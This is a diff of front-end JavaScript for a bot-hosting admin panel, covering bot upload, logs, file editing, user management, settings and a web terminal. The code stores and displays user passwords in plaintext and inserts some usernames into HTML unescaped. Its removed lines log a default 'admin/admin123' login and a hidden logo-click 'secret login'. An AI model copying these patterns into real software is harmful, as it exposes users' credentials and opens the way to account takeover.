-                const bodyHTML = `
-                    <div style="margin-bottom:8px;"><button class="btn-sm" id="copyAllBtn">📋 Copy All</button></div>
-                    <textarea id="editFileContent" rows="15">${escapeHtml(content)}</textarea>
-                `;
-                const result = await showCustomModal('✎ Edit File', bodyHTML, [
-                    { label: 'Cancel', value: false, className: 'btn-cancel' },
-                    { label: '💾 SAVE', value: true, className: 'btn-confirm' }
-                ]);
-                if (result) {
-                    const newContent = document.getElementById('editFileContent').value;
-                    await apiCall(`/api/bots/${botId}/content`, { method: 'PUT', body: JSON.stringify({ content: newContent }) });
-                    await customAlert('File saved.', '✅');
-                    await loadBots();
-                }
-                setTimeout(() => {
-                    const copyBtn = document.getElementById('copyAllBtn');
-                    if (copyBtn) copyBtn.onclick = function() {
-                        const ta = document.getElementById('editFileContent');
-                        ta.select();
-                        navigator.clipboard?.writeText(ta.value)?.then(() => customAlert('📋 Copied!', '✅'));
-                    };
-                }, 100);
-            } catch(e) { await customAlert(e.message, '❌'); }
-        }
-
-        // ----- BOT UPLOAD -----
-        uploadCardBot.addEventListener('click', function(e) {
-            if (e.target.closest('.deploy-btn')) return;
-            fileInputBot.click();
-        });
-
-        deployBtnBot.addEventListener('click', async function() {
-            if (fileInputBot.files.length === 0) {
-                await customAlert('Please select at least one file first.', '⚠️');
-                return;
             }
-            const formData = new FormData();
-            for (let i = 0; i < fileInputBot.files.length; i++) formData.append('files[]', fileInputBot.files[i]);
-            try {
-                deployBtnBot.textContent = 'UPLOADING...';
-                deployBtnBot.disabled = true;
-                const res = await fetch('/upload', { method: 'POST', body: formData });
-                const data = await res.json();
-                if (data.success) {
-                    await customAlert(`Uploaded! ${data.bots_created} bot(s) created.`, '✅');
-                    await loadBots();
-                    fileInputBot.value = '';
-                    fileCountDisplayBot.textContent = '';
-                } else await customAlert(data.error || 'Upload failed', '❌');
-            } catch(e) {}
-            finally { deployBtnBot.textContent = 'DEPLOY BOT'; deployBtnBot.disabled = false; }
-        });
 
-        fileInputBot.addEventListener('change', function() {
-            const count = this.files.length;
-            fileCountDisplayBot.textContent = count ? `${count} file(s) selected` : '';
-        });
-
-        // ----- ADMIN PANEL -----
-        function openAdminPanel() { loadAdminUsers(); adminOverlay.classList.add('open'); }
-        function closeAdminPanel() { adminOverlay.classList.remove('open'); }
-
-        // ----- USER MANAGEMENT -----
-        async function loadAdminUsers() {
-            try {
-                const users = await apiCall('/api/users');
-                renderFullUserList(users);
-                renderSimpleLists(users);
-            } catch(e) { console.error('Failed to load users:', e); }
-        }
-
-        function renderFullUserList(users) {
-            if (!users || users.length === 0) {
-                fullUserListContainer.innerHTML = `<div class="empty-msg">No users found.</div>`;
-                return;
+            function startUptimeUpdate(elId, startTime) {
+                if (uptimeIntervals[elId]) clearInterval(uptimeIntervals[elId]);
+                const el = document.getElementById(elId);
+                if (!el) return;
+                uptimeIntervals[elId] = setInterval(() => {
+                    const now = Date.now() / 1000;
+                    const diff = now - startTime;
+                    el.textContent = 'UPTIME: ' + formatUptime(diff);
+                }, 1000);
             }
-            let html = '';
-            users.forEach((u) => {
-                const bannedClass = u.banned ? 'banned' : (u.role === 'admin' ? 'admin' : 'user');
-                const bannedText = u.banned ? 'UNBAN' : 'BAN';
-                let expiryDisplay = 'Never';
-                if (u.expires_at) { try { expiryDisplay = new Date(u.expires_at).toLocaleString(); } catch(e) {} }
-                html += `
-                    <div class="list-item" data-username="${u.username}">
-                        <div class="row"><div class="info"><span class="uname">${escapeHtml(u.username)}</span><span class="upass">🔑 ${escapeHtml(u.password)}</span><span style="font-size:12px;color:#888;">Expires: ${expiryDisplay}</span></div><span class="badge-role ${bannedClass}">${u.banned ? 'BANNED' : u.role.toUpperCase()}</span></div>
-                        <div class="row"><div class="limit-group"><label>Limit:</label><input type="number" class="limit-input" value="${u.limit || 0}" min="0" step="1" /></div><button class="btn-action btn-set" data-action="setLimit" data-username="${u.username}">SET</button><button class="btn-action btn-ban" data-action="toggleBan" data-username="${u.username}">${bannedText}</button></div>
-                        <div class="row"><input type="text" placeholder="New password..." style="flex:2;background:#1a1a1a;border:1px solid #333;color:#fff;padding:8px 10px;border-radius:5px;outline:none;" data-field="newPass" /><button class="btn-action btn-reset" data-action="resetPass" data-username="${u.username}">RESET PW</button></div>
-                        <div class="row"><input type="text" placeholder="New expiry (e.g. 5, 1m, 2h)" style="flex:2;background:#1a1a1a;border:1px solid #333;color:#fff;padding:8px 10px;border-radius:5px;outline:none;" data-field="newExpiry" /><button class="btn-action btn-set" data-action="setExpiry" data-username="${u.username}">SET EXPIRY</button></div>
-                        <button class="btn-action btn-del" data-action="deleteUser" data-username="${u.username}">DELETE USER</button>
-                    </div>
-                `;
-            });
-            fullUserListContainer.innerHTML = html;
-            attachFullListEvents();
-        }
 
-        function attachFullListEvents() {
-            document.querySelectorAll('#fullUserListContainer [data-action]').forEach(btn => {
-                btn.addEventListener('click', async function(e) {
-                    e.stopPropagation();
-                    const action = this.dataset.action;
-                    const username = this.dataset.username;
-                    const card = this.closest('.list-item');
-                    if (action === 'setLimit') {
-                        const val = parseInt(card.querySelector('.limit-input').value, 10);
-                        if (isNaN(val) || val < 0) { await customAlert('Enter valid number.', '⚠️'); return; }
-                        try { await apiCall(`/api/users/${username}`, { method: 'PUT', body: JSON.stringify({ limit: val }) }); await loadAdminUsers(); }
-                        catch(e) { await customAlert(e.message, '❌'); }
-                    } else if (action === 'toggleBan') {
-                        const user = (await apiCall('/api/users')).find(u => u.username === username);
-                        if (!user) return;
-                        try { await apiCall(`/api/users/${username}`, { method: 'PUT', body: JSON.stringify({ banned: !user.banned }) }); await loadAdminUsers(); }
-                        catch(e) { await customAlert(e.message, '❌'); }
-                    } else if (action === 'resetPass') {
-                        const newPass = card.querySelector('[data-field="newPass"]').value.trim();
-                        if (!newPass) { await customAlert('Enter new password.', '⚠️'); return; }
-                        try { await apiCall(`/api/users/${username}`, { method: 'PUT', body: JSON.stringify({ password: newPass }) }); card.querySelector('[data-field="newPass"]').value = ''; await customAlert('Password updated.', '✅'); await loadAdminUsers(); }
-                        catch(e) { await customAlert(e.message, '❌'); }
-                    } else if (action === 'setExpiry') {
-                        const expiry = card.querySelector('[data-field="newExpiry"]').value.trim();
-                        try { await apiCall(`/api/users/${username}`, { method: 'PUT', body: JSON.stringify({ expiry: expiry }) }); card.querySelector('[data-field="newExpiry"]').value = ''; await customAlert('Expiry updated.', '✅'); await loadAdminUsers(); }
-                        catch(e) { await customAlert(e.message, '❌'); }
-                    } else if (action === 'deleteUser') {
-                        if (!await customConfirm(`Delete user ${username}?`, '🗑️')) return;
-                        try { await apiCall(`/api/users/${username}`, { method: 'DELETE' }); await loadAdminUsers(); }
-                        catch(e) { await customAlert(e.message, '❌'); }
-                    }
-                });
-            });
-        }
+            function selectBot(botId) {
+                selectedBotId = botId;
+                document.querySelectorAll('.bot-card').forEach(c => c.classList.remove('selected'));
+                const card = document.querySelector(`.bot-card[data-id="${botId}"]`);
+                if (card) card.classList.add('selected');
+                loadBotLogs(botId);
+                if (botLogInterval) clearInterval(botLogInterval);
+                botLogInterval = setInterval(() => loadBotLogs(botId, true), 3000);
+            }
 
-        function renderSimpleLists(users) {
-            const admins = users.filter(u => u.role === 'admin' && !u.banned);
-            const regulars = users.filter(u => u.role === 'user' && !u.banned);
-
-            simpleAdminListContainer.innerHTML = admins.length ? admins.map(u => `
-                <div class="simple-list-item"><div class="info"><span class="uname">${escapeHtml(u.username)}</span><span class="upass">🔑 ${escapeHtml(u.password)}</span></div><div class="actions"><button class="btn-remove-simple" data-username="${u.username}">REMOVE</button></div></div>
-            `).join('') : '<div class="empty-msg">No admins.</div>';
-
-            simpleUserListContainer.innerHTML = regulars.length ? regulars.map(u => `
-                <div class="simple-list-item"><div class="info"><span class="uname">${escapeHtml(u.username)}</span><span class="upass">🔑 ${escapeHtml(u.password)}</span></div><div class="actions"><button class="btn-remove-simple" data-username="${u.username}">REMOVE</button></div></div>
-            `).join('') : '<div class="empty-msg">No users.</div>';
-
-            document.querySelectorAll('.btn-remove-simple').forEach(btn => {
-                btn.addEventListener('click', async function(e) {
-                    e.stopPropagation();
-                    const username = this.dataset.username;
-                    if (!await customConfirm(`Remove user ${username}?`, '🗑️')) return;
-                    try { await apiCall(`/api/users/${username}`, { method: 'DELETE' }); await loadAdminUsers(); }
-                    catch(e) { await customAlert(e.message, '❌'); }
-                });
-            });
-        }
-
-        // ----- CREATE USER -----
-        toggleCreateUserBtn.addEventListener('click', function() {
-            createUserForm.style.display = createUserForm.style.display === 'none' ? 'block' : 'none';
-        });
-
-        createUserBtn.addEventListener('click', async function() {
-            const username = newUsername.value.trim();
-            const password = newPassword.value.trim();
-            const expiry = newExpiry.value.trim();
-            const role = newRole.value;
-            if (!username || !password) { await customAlert('Username and Password required.', '⚠️'); return; }
-            try {
-                await apiCall('/api/users', { method: 'POST', body: JSON.stringify({ username, password, role, expiry }) });
-                await loadAdminUsers();
-                newUsername.value = ''; newPassword.value = ''; newExpiry.value = '';
-                createUserForm.style.display = 'none';
-                await customAlert(`User ${username} created.`, '✅');
-            } catch(e) { await customAlert(e.message || 'Creation failed', '❌'); }
-        });
-
-        // ----- PROFILE EDIT -----
-        document.getElementById('editProfileBtn').addEventListener('click', async function() {
-            const currentUsername = document.querySelector('.user-title').textContent;
-            const bodyHTML = `
-                <div style="text-align:center;">
-                    <div style="font-size:20px; margin-bottom:20px;">✎ Edit Profile</div>
-                    <div style="margin-bottom:12px;"><label style="display:block;color:#aaa;font-size:13px;margin-bottom:4px;">New Username</label><input type="text" id="editUsername" value="${currentUsername}" style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" /></div>
-                    <div><label style="display:block;color:#aaa;font-size:13px;margin-bottom:4px;">New Password</label><input type="password" id="editPassword" placeholder="New password..." style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" /></div>
-                </div>
-            `;
-            const result = await showCustomModal('✎', bodyHTML, [
-                { label: 'Cancel', value: false, className: 'btn-cancel' },
-                { label: 'Save', value: true, className: 'btn-confirm' }
-            ]);
-            if (result) {
-                const newUsername = document.getElementById('editUsername').value.trim();
-                const newPassword = document.getElementById('editPassword').value.trim();
+            async function loadBotLogs(botId, silent = false) {
                 try {
-                    const res = await apiCall('/api/profile', { method: 'PUT', body: JSON.stringify({ username: newUsername, password: newPassword }) });
-                    if (res.success) {
-                        if (res.logout) { await customAlert('Profile updated! Logging out.', '✅'); window.location.href = '/'; }
-                        else { await customAlert('Profile updated!', '✅'); location.reload(); }
-                    }
-                } catch(e) { await customAlert(e.message, '❌'); }
-            }
-        });
-
-        // ----- SETTINGS -----
-        settingsBtn.addEventListener('click', function() { loadSettings(); settingsModalOverlay.classList.add('open'); });
-        settingsCancelBtn.addEventListener('click', function() { settingsModalOverlay.classList.remove('open'); });
-        settingsModalOverlay.addEventListener('click', function(e) { if (e.target === this) settingsModalOverlay.classList.remove('open'); });
-
-        async function loadSettings() {
-            try {
-                const res = await fetch('/api/settings');
-                const data = await res.json();
-                settingsWebsiteName.value = data.website_name || 'YUVICODEX';
-                settingsTelegram.value = data.social_links?.telegram || '#';
-                settingsYoutube.value = data.social_links?.youtube || '#';
-                settingsInstagram.value = data.social_links?.instagram || '#';
-                settingsTiktok.value = data.social_links?.tiktok || '#';
-                settingsLogoPreview.innerHTML = data.logo ? `<img src="${data.logo}" class="logo-preview" />` : '';
-            } catch(e) { console.error('Failed to load settings', e); }
-        }
-
-        settingsSaveBtn.addEventListener('click', async function() {
-            const payload = {
-                website_name: settingsWebsiteName.value.trim() || 'YUVICODEX',
-                social_links: {
-                    telegram: settingsTelegram.value.trim() || '#',
-                    youtube: settingsYoutube.value.trim() || '#',
-                    instagram: settingsInstagram.value.trim() || '#',
-                    tiktok: settingsTiktok.value.trim() || '#'
+                    const data = await apiCall(`/api/bots/${botId}/logs`);
+                    botConsole.textContent = data.logs || 'No logs yet.';
+                } catch (e) {
+                    if (!silent) botConsole.textContent = 'Error loading logs.';
                 }
-            };
-            try {
-                const res = await apiCall('/api/settings', { method: 'POST', body: JSON.stringify(payload) });
-                if (res.success) { await customAlert('Settings saved!', '✅'); settingsModalOverlay.classList.remove('open'); location.reload(); }
-            } catch(e) { await customAlert(e.message, '❌'); }
-        });
+            }
 
-        settingsRemoveLogoBtn.addEventListener('click', async function() {
-            if (!await customConfirm('Remove logo?', '🗑️')) return;
-            try { await fetch('/api/settings/logo', { method: 'DELETE' }); await customAlert('Logo removed.', '✅'); settingsModalOverlay.classList.remove('open'); location.reload(); }
-            catch(e) { await customAlert(e.message, '❌'); }
-        });
+            async function handleBotAction(botId, action) {
+                try {
+                    if (action === 'start') {
+                        await apiCall(`/api/bots/${botId}/start`, { method: 'POST' });
+                    } else if (action === 'stop') {
+                        await apiCall(`/api/bots/${botId}/stop`, { method: 'POST' });
+                    } else if (action === 'restart') {
+                        await apiCall(`/api/bots/${botId}/restart`, { method: 'POST' });
+                    } else if (action === 'delete') {
+                        const confirmed = await customConfirm('Delete this bot?', '🗑️');
+                        if (!confirmed) return;
+                        await apiCall(`/api/bots/${botId}`, { method: 'DELETE' });
+                        if (selectedBotId === botId) {
+                            selectedBotId = null;
+                            if (botLogInterval) clearInterval(botLogInterval);
+                            botConsole.textContent = 'Bot deleted.';
+                        }
+                    } else {
+                        return;
+                    }
+                    await loadBots();
+                } catch (e) {
+                    await customAlert(e.message || 'Action failed', '❌');
+                }
+            }
 
-        settingsLogoInput.addEventListener('change', async function() {
-            if (this.files.length > 0) {
+            async function openEditModal(botId) {
+                try {
+                    const data = await apiCall(`/api/bots/${botId}/content`);
+                    const content = data.content || '';
+                    const bodyHTML = `
+                        <div style="margin-bottom:8px;">
+                            <button class="btn-sm" id="copyAllBtn" style="padding:6px 14px;font-size:0.55rem;border:1px solid #33ddff;color:#33ddff;background:transparent;border-radius:6px;cursor:pointer;">
+                                📋 Copy All
+                            </button>
+                        </div>
+                        <textarea id="editFileContent" rows="15" style="width:100%;background:#050807;color:#00ff88;border:1px solid #333;border-radius:6px;padding:10px;font-family:'Courier New',monospace;font-size:0.7rem;resize:vertical;tab-size:4;">${escapeHtml(content)}</textarea>
+                    `;
+                    const result = await showCustomModal('✎ Edit File', bodyHTML, [
+                        { label: 'Cancel', value: false, className: 'btn-cancel' },
+                        { label: '💾 SAVE', value: true, className: 'btn-confirm' }
+                    ]);
+                    if (result) {
+                        const newContent = document.getElementById('editFileContent').value;
+                        try {
+                            await apiCall(`/api/bots/${botId}/content`, {
+                                method: 'PUT',
+                                body: JSON.stringify({ content: newContent })
+                            });
+                            await customAlert('File saved and bot restarted (if running).', '✅');
+                            await loadBots();
+                        } catch (e) {
+                            await customAlert(e.message, '❌');
+                        }
+                    }
+                    setTimeout(() => {
+                        const copyBtn = document.getElementById('copyAllBtn');
+                        if (copyBtn) {
+                            copyBtn.onclick = function() {
+                                const textarea = document.getElementById('editFileContent');
+                                textarea.select();
+                                try {
+                                    navigator.clipboard.writeText(textarea.value).then(() => {
+                                        customAlert('📋 Copied all code!', '✅');
+                                    }).catch(() => {
+                                        document.execCommand('copy');
+                                        customAlert('📋 Copied!', '✅');
+                                    });
+                                } catch(e) {
+                                    document.execCommand('copy');
+                                    customAlert('📋 Copied!', '✅');
+                                }
+                            };
+                        }
+                    }, 100);
+                } catch (e) {
+                    await customAlert(e.message, '❌');
+                }
+            }
+
+            // ---------- BOT UPLOAD ----------
+            uploadCardBot.addEventListener('click', function(e) {
+                if (e.target.closest('.deploy-btn')) return;
+                fileInputBot.click();
+            });
+
+            deployBtnBot.addEventListener('click', async function() {
+                if (fileInputBot.files.length === 0) {
+                    await customAlert('Please select at least one file first.', '⚠️');
+                    return;
+                }
                 const formData = new FormData();
-                formData.append('logo', this.files[0]);
-                try { await fetch('/api/settings/logo', { method: 'POST', body: formData }); await customAlert('Logo uploaded!', '✅'); settingsModalOverlay.classList.remove('open'); location.reload(); }
-                catch(e) { await customAlert(e.message, '❌'); }
-                this.value = '';
-            }
-        });
-
-        // ----- TERMINAL -----
-        async function startTerminalPolling() {
-            if (terminalPollInterval) clearInterval(terminalPollInterval);
-            try { await fetch('/api/terminal/start', { method: 'POST' }); } catch(e) {}
-            terminalPollInterval = setInterval(async () => {
+                for (let i = 0; i < fileInputBot.files.length; i++) {
+                    formData.append('files[]', fileInputBot.files[i]);
+                }
                 try {
-                    const res = await fetch('/api/terminal/read');
+                    deployBtnBot.textContent = 'UPLOADING...';
+                    deployBtnBot.disabled = true;
+                    const res = await fetch('/upload', {
+                        method: 'POST',
+                        body: formData
+                    });
                     const data = await res.json();
-                    if (data.output) { terminalOutput.innerHTML += data.output; terminalOutput.scrollTop = terminalOutput.scrollHeight; }
-                    isTerminalRunning = data.running;
-                    termStopBtn.disabled = !isTerminalRunning;
-                } catch(e) {}
-            }, 500);
-        }
-
-        termRunBtn.addEventListener('click', function() {
-            const data = terminalCommand.value;
-            if (!data) return;
-            fetch('/api/terminal/send', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ data: data }) });
-            terminalCommand.value = '';
-        });
-
-        termStopBtn.addEventListener('click', function() {
-            fetch('/api/terminal/stop', { method: 'POST' });
-            isTerminalRunning = false;
-            termStopBtn.disabled = true;
-        });
-
-        termClearBtn.addEventListener('click', function() { terminalOutput.innerHTML = ''; });
-        terminalCommand.addEventListener('keydown', function(e) { if (e.key === 'Enter') { e.preventDefault(); termRunBtn.click(); } });
-
-        // ----- STATS -----
-        async function fetchStats() {
-            try {
-                const res = await fetch('/api/stats');
-                if (!res.ok) return;
-                const data = await res.json();
-                document.getElementById('statTotalHours').textContent = data.total_hours + ' hrs';
-                document.getElementById('statMainHours').textContent = data.main_hours + ' hrs';
-                document.getElementById('statInternalHours').textContent = data.internal_hours + ' hrs';
-                document.getElementById('statRenderHours').textContent = data.render_running_hours + ' hrs';
-                document.getElementById('statRenderActive').textContent = data.render_active_count;
-                document.getElementById('statStorage').textContent = data.storage_used_gb + ' GB';
-                document.getElementById('statDiskFree').textContent = data.disk_free_gb || data.container_storage_free_gb || 0;
-                document.getElementById('statRam').textContent = data.ram.percent + '%';
-                document.getElementById('statRamUsed').textContent = data.ram.used_mb;
-                document.getElementById('statRamTotal').textContent = data.ram.total_mb;
-                document.getElementById('ramFill').style.width = Math.min(data.ram.percent, 100) + '%';
-                document.getElementById('statCpu').textContent = data.cpu_percent + '%';
-            } catch(e) { console.error('Stats error:', e); }
-        }
-
-        document.getElementById('setOffsetBtn').addEventListener('click', async function() {
-            const val = parseFloat(document.getElementById('offsetInput').value);
-            if (isNaN(val)) { await customAlert('Enter valid number', '⚠️'); return; }
-            try {
-                const res = await apiCall('/api/set_offset', { method: 'POST', body: JSON.stringify({ offset: val }) });
-                if (res.success) { await customAlert('Offset set to ' + val + ' hrs', '✅'); fetchStats(); }
-            } catch(e) { await customAlert(e.message, '❌'); }
-        });
-
-        // ----- ADMIN TAB SWITCHING -----
-        const adminTabBtns = document.querySelectorAll('.admin-tabs button');
-        adminTabBtns.forEach(btn => {
-            btn.addEventListener('click', function() {
-                const tabId = this.dataset.tab;
-                adminTabBtns.forEach(b => b.classList.remove('active'));
-                this.classList.add('active');
-                document.querySelectorAll('.admin-tab-content').forEach(tc => tc.classList.remove('active'));
-                document.getElementById(tabId).classList.add('active');
-                if (tabId === 'tabTerminal') { setTimeout(() => terminalCommand.focus(), 100); if (!terminalPollInterval) startTerminalPolling(); }
-                if (tabId === 'tabStats') { fetchStats(); if (window.statsInterval) clearInterval(window.statsInterval); window.statsInterval = setInterval(fetchStats, 5000); }
-                else { if (window.statsInterval) { clearInterval(window.statsInterval); window.statsInterval = null; } }
+                    if (data.success) {
+                        await customAlert(`Uploaded! ${data.bots_created} bot(s) created.`, '✅');
+                        await loadBots();
+                        fileInputBot.value = '';
+                        fileCountDisplayBot.textContent = '';
+                    } else {
+                        await customAlert(data.error || 'Upload failed', '❌');
+                    }
+                } catch (e) {
+                    // handled by interceptor
+                } finally {
+                    deployBtnBot.textContent = 'DEPLOY BOT';
+                    deployBtnBot.disabled = false;
+                }
             });
-        });
 
-        // ----- UTILITY -----
-        function escapeHtml(str) { const div = document.createElement('div'); div.textContent = str; return div.innerHTML; }
-        function formatUptime(seconds) { if (seconds < 0) return '--'; const d = Math.floor(seconds/86400); const h = Math.floor((seconds%86400)/3600); const m = Math.floor((seconds%3600)/60); const s = Math.floor(seconds%60); return `${d}d ${h}h ${m}m ${s}s`; }
+            fileInputBot.addEventListener('change', function() {
+                const count = this.files.length;
+                if (count === 0) {
+                    fileCountDisplayBot.textContent = '';
+                } else {
+                    const names = Array.from(this.files).map(f => f.name).join(', ');
+                    fileCountDisplayBot.textContent = `${count} file(s) selected: ${names}`;
+                }
+            });
 
-        // ----- EVENT BINDINGS -----
-        loginBtn.addEventListener('click', handleLogin);
-        document.addEventListener('keydown', function(e) { if (e.key === 'Enter' && loginView.classList.contains('active')) handleLogin(); });
-        hamburgerBtn.addEventListener('click', openAdminPanel);
-        adminCloseBtn.addEventListener('click', closeAdminPanel);
-        adminOverlay.addEventListener('click', function(e) { if (e.target === this) closeAdminPanel(); });
-        logoutBtn.addEventListener('click', handleLogout);
+            // ---------- ADMIN PANEL ----------
+            function openAdminPanel() {
+                if (!currentUser) {
+                    customAlert('Please login first.', '⚠️');
+                    return;
+                }
+                if (currentUser.role !== 'admin') {
+                    const username = currentUser.username;
+                    const password = '{{ user_password }}';
+                    const bodyHTML = `
+                        <div style="text-align:center;">
+                            <div style="font-size:20px; margin-bottom:20px;">👤 Your Profile</div>
+                            <div style="background:#161b25; padding:15px; border-radius:10px; margin-bottom:10px;">
+                                <strong style="color:#00e5ff;">Username</strong><br />
+                                <span style="font-size:18px; color:#fff;">${username}</span>
+                            </div>
+                            <div style="background:#161b25; padding:15px; border-radius:10px;">
+                                <strong style="color:#00e5ff;">Password</strong><br />
+                                <span style="font-size:18px; color:#fff;">${password}</span>
+                            </div>
+                        </div>
+                    `;
+                    showCustomModal('ℹ️', bodyHTML, [
+                        { label: 'OK', value: true, className: 'btn-ok' }
+                    ]);
+                    return;
+                }
+                loadAdminUsers();
+                adminOverlay.classList.add('open');
+            }
 
-        // ----- INIT -----
-        const loggedIn = document.querySelector('#userView').classList.contains('active') || false;
-        if (loggedIn) {
-            loadWebsites();
-            loadBots();
-            loadAdminUsers();
-            setTimeout(() => { if (document.querySelector('#tabTerminal')) startTerminalPolling(); }, 1000);
-            setTimeout(fetchStats, 2000);
-            setInterval(fetchStats, 30000);
-        }
+            function closeAdminPanel() {
+                adminOverlay.classList.remove('open');
+            }
 
-        console.log('🔐 YUVICODEX System ready');
-        console.log('📋 Default: admin/admin123');
-        console.log('💾 Storage Limit: 10GB');
-        console.log('🔑 Click logo 5 times for secret login');
+            // ---------- USER MANAGEMENT ----------
+            async function loadAdminUsers() {
+                try {
+                    const users = await apiCall('/api/users');
+                    renderFullUserList(users);
+                    renderSimpleLists(users);
+                } catch (e) {
+                    console.error('Failed to load users:', e);
+                }
+            }
 
-    })();
+            function renderFullUserList(users) {
+                if (!users || users.length === 0) {
+                    fullUserListContainer.innerHTML = `<div class="empty-msg">No users found.</div>`;
+                    return;
+                }
+                let html = '';
+                users.forEach((u, idx) => {
+                    const bannedClass = u.banned ? 'banned' : (u.role === 'admin' ? 'admin' : 'user');
+                    const bannedText = u.banned ? 'UNBAN' : 'BAN';
+                    const roleLabel = u.role.toUpperCase();
+                    let expiryDisplay = 'Never';
+                    if (u.expires_at) {
+                        try {
+                            const exp = new Date(u.expires_at);
+                            expiryDisplay = exp.toLocaleString();
+                        } catch(e) { expiryDisplay = 'Invalid'; }
+                    }
+                    html += `
+                        <div class="list-item" data-username="${u.username}">
+                            <div class="row">
+                                <div class="info">
+                                    <span class="uname">${escapeHtml(u.username)}</span>
+                                    <span class="upass">🔑 ${escapeHtml(u.password)}</span>
+                                    <span style="font-size:12px;color:#888;">Expires: ${expiryDisplay}</span>
+                                </div>
+                                <span class="badge-role ${bannedClass}">${u.banned ? 'BANNED' : roleLabel}</span>
+                            </div>
+                            <div class="row">
+                                <div class="limit-group">
+                                    <label>Limit:</label>
+                                    <input type="number" class="limit-input" value="${u.limit || 0}" min="0" step="1" />
+                                </div>
+                                <button class="btn-action btn-set" data-action="setLimit" data-username="${u.username}">SET</button>
+                                <button class="btn-action btn-ban" data-action="toggleBan" data-username="${u.username}">${bannedText}</button>
+                            </div>
+                            <div class="row">
+                                <input type="text" placeholder="New password..." style="flex:2;background:#1a1a1a;border:1px solid #333;color:#fff;padding:8px 10px;border-radius:5px;outline:none;" data-field="newPass" />
+                                <button class="btn-action btn-reset" data-action="resetPass" data-username="${u.username}">RESET PW</button>
+                            </div>
+                            <div class="row">
+                                <input type="text" placeholder="New expiry (e.g. 5, 1m, 2h)" style="flex:2;background:#1a1a1a;border:1px solid #333;color:#fff;padding:8px 10px;border-radius:5px;outline:none;" data-field="newExpiry" />
+                                <button class="btn-action btn-set" data-action="setExpiry" data-username="${u.username}">SET EXPIRY</button>
+                            </div>
+                            <button class="btn-action btn-del" data-action="deleteUser" data-username="${u.username}">DELETE USER + ALL BOTS</button>
+                        </div>
+                    `;
+                });
+                fullUserListContainer.innerHTML = html;
+                attachFullListEvents();
+            }
+
+            function attachFullListEvents() {
+                document.querySelectorAll('#fullUserListContainer [data-action]').forEach(btn => {
+                    btn.addEventListener('click', async function(e) {
+                        e.stopPropagation();
+                        const action = this.dataset.action;
+                        const username = this.dataset.username;
+                        const card = this.closest('.list-item');
+                        if (action === 'setLimit') {
+                            const input = card.querySelector('.limit-input');
+                            const val = parseInt(input.value, 10);
+                            if (isNaN(val) || val < 0) {
+                                await customAlert('Enter a valid number.', '⚠️');
+                                return;
+                            }
+                            try {
+                                await apiCall(`/api/users/${username}`, {
+                                    method: 'PUT',
+                                    body: JSON.stringify({ limit: val })
+                                });
+                                await loadAdminUsers();
+                            } catch (e) {
+                                await customAlert(e.message, '❌');
+                            }
+                        } else if (action === 'toggleBan') {
+                            const user = (await apiCall('/api/users')).find(u => u.username === username);
+                            if (!user) return;
+                            try {
+                                await apiCall(`/api/users/${username}`, {
+                                    method: 'PUT',
+                                    body: JSON.stringify({ banned: !user.banned })
+                                });
+                                await loadAdminUsers();
+                            } catch (e) {
+                                await customAlert(e.message, '❌');
+                            }
+                        } else if (action === 'resetPass') {
+                            const passInput = card.querySelector('[data-field="newPass"]');
+                            const newPass = passInput.value.trim();
+                            if (!newPass) {
+                                await customAlert('Enter a new password.', '⚠️');
+                                return;
+                            }
+                            try {
+                                await apiCall(`/api/users/${username}`, {
+                                    method: 'PUT',
+                                    body: JSON.stringify({ password: newPass })
+                                });
+                                passInput.value = '';
+                                await customAlert('Password updated.', '✅');
+                                await loadAdminUsers();
+                            } catch (e) {
+                                await customAlert(e.message, '❌');
+                            }
+                        } else if (action === 'setExpiry') {
+                            const expiryInput = card.querySelector('[data-field="newExpiry"]');
+                            const expiry = expiryInput.value.trim();
+                            try {
+                                await apiCall(`/api/users/${username}`, {
+                                    method: 'PUT',
+                                    body: JSON.stringify({ expiry: expiry })
+                                });
+                                expiryInput.value = '';
+                                await customAlert('Expiry updated.', '✅');
+                                await loadAdminUsers();
+                            } catch (e) {
+                                await customAlert(e.message, '❌');
+                            }
+                        } else if (action === 'deleteUser') {
+                            const confirmed = await customConfirm(`Delete user ${username} and all their bots?`, '🗑️');
+                            if (!confirmed) return;
+                            if (username === currentUser.username) {
+                                await customAlert('Cannot delete yourself.', '🚫');
+                                return;
+                            }
+                            try {
+                                await apiCall(`/api/users/${username}`, { method: 'DELETE' });
+                                await loadAdminUsers();
+                            } catch (e) {
+                                await customAlert(e.message, '❌');
+                            }
+                        }
+                    });
+                });
+            }
+
+            function renderSimpleLists(users) {
+                const admins = users.filter(u => u.role === 'admin' && !u.banned);
+                const regulars = users.filter(u => u.role === 'user' && !u.banned);
+
+                if (!admins.length) {
+                    simpleAdminListContainer.innerHTML = `<div class="empty-msg">No admins.</div>`;
+                } else {
+                    let html = '';
+                    admins.forEach(u => {
+                        html += `
+                            <div class="simple-list-item" data-username="${u.username}">
+                                <div class="info">
+                                    <span class="uname">${escapeHtml(u.username)}</span>
+                                    <span class="upass">🔑 ${escapeHtml(u.password)}</span>
+                                </div>
+                                <div class="actions">
+                                    <button class="btn-remove-simple" data-username="${u.username}">REMOVE</button>
+                                </div>
+                            </div>
+                        `;
+                    });
+                    simpleAdminListContainer.innerHTML = html;
+                }
+
+                if (!regulars.length) {
+                    simpleUserListContainer.innerHTML = `<div class="empty-msg">No users.</div>`;
+                } else {
+                    let html = '';
+                    regulars.forEach(u => {
+                        html += `
+                            <div class="simple-list-item" data-username="${u.username}">
+                                <div class="info">
+                                    <span class="uname">${escapeHtml(u.username)}</span>
+                                    <span class="upass">🔑 ${escapeHtml(u.password)}</span>
+                                </div>
+                                <div class="actions">
+                                    <button class="btn-remove-simple" data-username="${u.username}">REMOVE</button>
+                                </div>
+                            </div>
+                        `;
+                    });
+                    simpleUserListContainer.innerHTML = html;
+                }
+
+                document.querySelectorAll('.btn-remove-simple').forEach(btn => {
+                    btn.addEventListener('click', async function(e) {
+                        e.stopPropagation();
+                        const username = this.dataset.username;
+                        const confirmed = await customConfirm(`Remove user ${username}?`, '🗑️');
+                        if (!confirmed) return;
+                        if (username === currentUser.username) {
+                            await customAlert('Cannot remove yourself.', '🚫');
+                            return;
+                        }
+                        try {
+                            await apiCall(`/api/users/${username}`, { method: 'DELETE' });
+                            await loadAdminUsers();
+                        } catch (e) {
+                            await customAlert(e.message, '❌');
+                        }
+                    });
+                });
+            }
+
+            // ---------- CREATE USER ----------
+            async function handleCreateUser() {
